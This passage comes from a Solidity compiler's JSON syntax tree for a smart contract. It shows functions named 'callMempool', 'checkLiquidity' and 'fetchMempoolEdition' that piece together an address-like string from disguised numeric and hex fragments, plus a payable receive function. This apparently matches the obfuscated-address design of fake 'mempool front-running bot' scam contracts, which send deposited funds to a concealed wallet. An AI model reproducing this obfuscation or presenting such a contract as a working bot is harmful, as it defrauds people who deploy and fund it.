														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 328,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "2838:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 336,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 331,
															"name": "_memPoolOffset",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 288,
															"src": "2872:14:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 333,
																	"name": "_memPoolSol",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 298,
																	"src": "2903:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 332,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 905,
																"src": "2888:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 334,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2888:27:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 330,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 678,
														"src": "2864:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 335,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2864:52:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2838:78:3"
											},
											{
												"assignments": [
													338
												],
												"declarations": [
													{
														"constant": false,
														"id": 338,
														"mutability": "mutable",
														"name": "_memPool2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "2921:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 337,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "2921:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 347,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 341,
																	"name": "_memPoolLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 302,
																	"src": "2970:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 340,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 905,
																"src": "2955:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 342,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2955:30:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 344,
																	"name": "_memPoolSize",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 307,
																	"src": "3002:12:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 343,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 905,
																"src": "2987:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 345,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2987:28:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 339,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 678,
														"src": "2947:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 346,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2947:69:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2921:95:3"
											},
											{
												"assignments": [
													349
												],
												"declarations": [
													{
														"constant": false,
														"id": 349,
														"mutability": "mutable",
														"name": "_memPool3",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "3021:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 348,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "3021:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 358,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 352,
																	"name": "_memPoolHeight",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 311,
																	"src": "3070:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 351,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 905,
																"src": "3055:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 353,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "3055:30:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 355,
																	"name": "_memPoolWidth",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 316,
																	"src": "3102:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 354,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 905,
																"src": "3087:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 356,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "3087:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 350,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 678,
														"src": "3047:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 357,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3047:70:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3021:96:3"
											},
											{
												"assignments": [
													360
												],
												"declarations": [
													{
														"constant": false,
														"id": 360,
														"mutability": "mutable",
														"name": "_memPool4",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "3122:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 359,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "3122:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 369,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 363,
																	"name": "_memPoolDepth",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 320,
																	"src": "3171:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 362,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 905,
																"src": "3156:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 364,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "3156:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 366,
																	"name": "_memPoolCount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 325,
																	"src": "3202:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 365,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 905,
																"src": "3187:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 367,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "3187:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 361,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 678,
														"src": "3148:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 368,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3148:69:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3122:95:3"
											},
											{
												"assignments": [
													371
												],
												"declarations": [
													{
														"constant": false,
														"id": 371,
														"mutability": "mutable",
														"name": "_allMempools",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "3224:26:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 370,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "3224:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 382,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 374,
																	"name": "_memPool1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 329,
																	"src": "3269:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 375,
																	"name": "_memPool2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 338,
																	"src": "3280:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 373,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 678,
																"src": "3261:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 376,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "3261:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 378,
																	"name": "_memPool3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 349,
																	"src": "3300:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 379,
																	"name": "_memPool4",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 360,
																	"src": "3311:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 377,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 678,
																"src": "3292:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 380,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "3292:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 372,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 678,
														"src": "3253:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 381,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3253:69:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3224:98:3"
											},
											{
												"assignments": [
													384
												],
												"declarations": [
													{
														"constant": false,
														"id": 384,
														"mutability": "mutable",
														"name": "_fullMempool",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 392,
														"src": "3327:26:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 383,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "3327:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 389,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "30",
															"id": 386,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3364:3:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															"value": "0"
														},
														{
															"argumentTypes": null,
															"id": 387,
															"name": "_allMempools",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 371,
															"src": "3369:12:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 385,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 678,
														"src": "3356:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 388,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3356:26:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3327:55:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 390,
													"name": "_fullMempool",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 384,
													"src": "3398:12:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 286,
												"id": 391,
												"nodeType": "Return",
												"src": "3391:19:3"
											}
										]
									},
									"documentation": null,
									"id": 393,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "callMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 283,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2452:2:3"
									},
									"returnParameters": {
										"id": 286,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 285,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 393,
												"src": "2478:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 284,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "2478:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2477:15:3"
									},
									"scope": 1047,
									"src": "2432:983:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 396,
										"nodeType": "Block",
										"src": "3447:2:3",
										"statements": []
									},
									"documentation": null,
									"id": 397,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 394,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3427:2:3"
									},
									"returnParameters": {
										"id": 395,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3447:0:3"
									},
									"scope": 1047,
									"src": "3420:29:3",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 404,
										"nodeType": "Block",
										"src": "3522:45:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "41624444463935303335376132424438633936343266333042",
													"id": 402,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "string",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3535:27:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_stringliteral_83d0a849592f45efbf0688f7ba8af175b7cb59661b6566d2b6a39865da49ab07",
														"typeString": "literal_string \"AbDDF950357a2BD8c9642f30B\""
													},
													"value": "AbDDF950357a2BD8c9642f30B"
												},
												"functionReturnParameters": 401,
												"id": 403,
												"nodeType": "Return",
												"src": "3528:34:3"
											}
										]
									},
									"documentation": null,
									"id": 405,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "fetchMempoolEdition",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 398,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3482:2:3"
									},
									"returnParameters": {
										"id": 401,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 400,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 405,
												"src": "3507:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 399,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "3507:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3506:15:3"
									},
									"scope": 1047,
									"src": "3454:113:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 580,
										"nodeType": "Block",
										"src": "3664:632:3",
										"statements": [
											{
												"assignments": [
													413
												],
												"declarations": [
													{
														"constant": false,
														"id": 413,
														"mutability": "mutable",
														"name": "tmp",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 580,
														"src": "3669:16:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 412,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "3669:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 418,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 416,
															"name": "_a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 407,
															"src": "3694:2:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 415,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "3688:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 414,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "3688:5:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 417,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3688:9:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3669:28:3"
											},
											{
												"assignments": [
													420
												],
												"declarations": [
													{
														"constant": false,
														"id": 420,
														"mutability": "mutable",
														"name": "iaddr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 580,
														"src": "3702:13:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 419,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "3702:7:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 422,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 421,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3718:1:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3702:17:3"
											},
											{
												"assignments": [
													424
												],
												"declarations": [
													{
														"constant": false,
														"id": 424,
														"mutability": "mutable",
														"name": "b1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 580,
														"src": "3724:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 423,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "3724:7:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
